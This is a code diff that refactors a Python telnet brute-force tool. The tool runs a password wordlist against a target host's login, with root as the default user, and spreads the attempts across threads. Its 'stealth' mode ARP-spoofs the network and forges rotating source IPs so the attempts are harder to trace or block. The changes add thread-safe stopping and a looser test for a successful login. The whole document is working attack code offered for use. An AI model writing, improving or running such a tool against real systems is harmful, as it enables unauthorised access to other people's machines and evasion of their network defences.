@@ -17,29 +17,30 @@ GREEN  = "\033[38;2;0;255;0m"
 RESET  = "\033[0m"
 BOLD   = "\033[1m"
 
-stopAttack    = False
+stopEvent     = threading.Event()
+stdoutLock    = threading.Lock()
 attemptsDone  = 0
 startTime     = 0
 
 def SignalHandler(sig, frame):
-    global stopAttack
     print(f"\n{RED}Stopping brute force...{RESET}")
-    stopAttack = True
+    stopEvent.set()
     sys.exit(0)
 
 def FormatDuration(seconds):
-    mins, secs = divmod(int(seconds), 60)
-    hrs, mins = divmod(mins, 60)
-    return f"{hrs:02}:{mins:02}:{secs:02}"
+    m, s = divmod(int(seconds), 60)
+    h, m = divmod(m, 60)
+    return f"{h:02}:{m:02}:{s:02}"
 
 def PrintProgress(total):
-    while not stopAttack:
+    while not stopEvent.is_set():
         elapsed = time.time() - startTime
-        with threading.Lock():
+        with stdoutLock:
             print(f"\r{RED}Attempts: {attemptsDone}/{total} | Duration: {FormatDuration(elapsed)}{RESET}", end="")
         time.sleep(1)
 
 def AttemptLogin(host, port, username, password, sourceIp=None):
+    """Returns True only on real login success."""
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     if sourceIp:
         try:
@@ -55,11 +56,20 @@ def AttemptLogin(host, port, username, password, sourceIp=None):
         tn.write(username.encode() + b"\n")
         tn.read_until(b"Password: ", timeout=3)
         tn.write(password.encode() + b"\n")
-        time.sleep(1)
-        out = tn.read_very_eager().decode(errors="ignore")
+
+        time.sleep(1.5)
+        output = tn.read_very_eager().decode(errors="ignore").lower()
         tn.close()
-        return any(p in out for p in ["#", "$", ">"])
-    except:
+
+        # detect failure messages
+        if "login incorrect" in output or "incorrect" in output or output.strip().endswith("login:"):
+            return False
+
+        # otherwise assume success
+        print(f"\n{GREEN}Success: {username}:{password}{RESET}")
+        return True
+
+    except Exception:
         return False
     finally:
         sock.close()
@@ -69,17 +79,16 @@ def ArpSpoofOnce(targetIp, fakeIp, iface):
     send(pkt, iface=iface, verbose=False)
 
 def WorkerNormal(host, port, username, passwords, delay):
-    """Mode 1: simple brute force, no ARP spoof."""
-    global attemptsDone, stopAttack
+    global attemptsDone
     failCount = 0
     for pwd in passwords:
-        if stopAttack:
+        if stopEvent.is_set():
             break
         if AttemptLogin(host, port, username, pwd):
-            print(f"\n{GREEN}Success: {username}:{pwd}{RESET}")
-            stopAttack = True
+            stopEvent.set()
             break
-        attemptsDone += 1
+        with stdoutLock:
+            attemptsDone += 1
         failCount += 1
         time.sleep(delay)
         if failCount >= 5:
@@ -88,18 +97,17 @@ def WorkerNormal(host, port, username, passwords, delay):
             failCount = 0
 
 def WorkerStealth(host, port, username, passwords, subnetPrefix, iface, delay):
-    """Mode 2: stealth using ARP spoof to rotate source IPs."""
-    global attemptsDone, stopAttack
+    global attemptsDone
     for pwd in passwords:
-        if stopAttack:
+        if stopEvent.is_set():
             break
         fakeIp = f"{subnetPrefix}.{random.randint(2,254)}"
         ArpSpoofOnce(host, fakeIp, iface)
         if AttemptLogin(host, port, username, pwd, sourceIp=fakeIp):
-            print(f"\n{GREEN}Success: {username}:{pwd}{RESET}")
-            stopAttack = True
+            stopEvent.set()
             break
-        attemptsDone += 1
+        with stdoutLock:
+            attemptsDone += 1
         time.sleep(delay)
 
 def StartAttack(host, port, username, passwords, mode, subnetPrefix, iface, threadsCount, delay):
@@ -108,10 +116,11 @@ def StartAttack(host, port, username, passwords, mode, subnetPrefix, iface, thre
     attemptsDone = 0
     total = len(passwords)
 
-    # progress thread
+    # start progress printer
     prog = threading.Thread(target=PrintProgress, args=(total,), daemon=True)
     prog.start()
 
+    # split work
     slices = [passwords[i::threadsCount] for i in range(threadsCount)]
     threads = []
     for i in range(threadsCount):
@@ -131,8 +140,8 @@ def StartAttack(host, port, username, passwords, mode, subnetPrefix, iface, thre
     for t in threads:
         t.join()
 
-    duration = FormatDuration(time.time() - startTime)
-    print(f"\n{RED}Attack complete. Total attempts: {attemptsDone} | Duration: {duration}{RESET}")
+    elapsed = time.time() - startTime
+    print(f"\n{RED}Attack complete. Total attempts: {attemptsDone} | Duration: {FormatDuration(elapsed)}{RESET}")
 
 def menu():
     host      = input(f"{RED}Target IP: {RESET}").strip()
@@ -140,38 +149,38 @@ def menu():
     username  = input(f"{RED}Username [root]: {RESET}").strip() or "root"
     threads   = int(input(f"{RED}Threads [10]: {RESET}") or "10")
     delay     = float(input(f"{RED}Delay between attempts (s) [1.0]: {RESET}") or "1.0")
-    wordlist  = os.path.join(os.path.dirname(__file__), "passwords.txt")
-    if not os.path.exists(wordlist):
+    wl = os.path.join(os.path.dirname(__file__), "passwords.txt")
+    if not os.path.exists(wl):
         print(f"{RED}passwords.txt not found{RESET}")
         return
-    with open(wordlist) as f:
+    with open(wl) as f:
         passwords = [l.strip() for l in f if l.strip()]
 
     choice = input(f"{RED}Mode: [1] Normal [2] Stealth (ARP spoof): {RESET}").strip()
     if choice == "2":
-        subnetPrefix = input(f"{RED}Subnet prefix (e.g. 192.168.1): {RESET}").strip()
-        iface        = input(f"{RED}Interface (e.g. eth0): {RESET}").strip()
-        StartAttack(host, port, username, passwords, "stealth", subnetPrefix, iface, threads, delay)
+        subnet = input(f"{RED}Subnet prefix (e.g. 192.168.1): {RESET}").strip()
+        iface  = input(f"{RED}Interface (e.g. eth0): {RESET}").strip()
+        StartAttack(host, port, username, passwords, "stealth", subnet, iface, threads, delay)
     else:
         StartAttack(host, port, username, passwords, "normal", None, None, threads, delay)
 
 def terminal():
-    parser = argparse.ArgumentParser(description="Telnet Brute Force Tool")
-    parser.add_argument("-i","--host",    required=True, help="Target IP")
-    parser.add_argument("-P","--port",    type=int, default=23, help="Telnet port")
-    parser.add_argument("-u","--username",default="root", help="Login username")
-    parser.add_argument("-m","--mode",    choices=["normal","stealth"], default="normal", help="Mode")
-    parser.add_argument("--subnet",       help="Subnet prefix (e.g. 192.168.1) for stealth")
-    parser.add_argument("--iface",        help="Interface (e.g. eth0) for stealth")
-    parser.add_argument("-t","--threads", type=int, default=10, help="Number of threads")
-    parser.add_argument("-d","--delay",   type=float, default=1.0, help="Delay between attempts (s)")
-    args = parser.parse_args()
+    p = argparse.ArgumentParser(description="Telnet Brute Force Tool")
+    p.add_argument("-i","--host",    required=True)
+    p.add_argument("-P","--port",    type=int, default=23)
+    p.add_argument("-u","--username",default="root")
+    p.add_argument("-m","--mode",    choices=["normal","stealth"], default="normal")
+    p.add_argument("--subnet",       help="Subnet prefix for stealth")
+    p.add_argument("--iface",        help="Interface for stealth")
+    p.add_argument("-t","--threads", type=int, default=10)
+    p.add_argument("-d","--delay",   type=float, default=1.0)
+    args = p.parse_args()
 
-    wordlist = os.path.join(os.path.dirname(__file__), "passwords.txt")
-    if not os.path.exists(wordlist):
+    wl = os.path.join(os.path.dirname(__file__), "passwords.txt")
+    if not os.path.exists(wl):
         print(f"{RED}passwords.txt not found{RESET}")
         return
-    with open(wordlist) as f:
+    with open(wl) as f:
         passwords = [l.strip() for l in f if l.strip()]
 
     StartAttack(
@@ -181,12 +190,9 @@ def terminal():
         args.threads, args.delay
     )
 
-def main():
+if __name__ == "__main__":
     signal.signal(signal.SIGINT, SignalHandler)
     if len(sys.argv) > 1:
         terminal()
     else:
         menu()
-
-if __name__ == "__main__":
-    main()
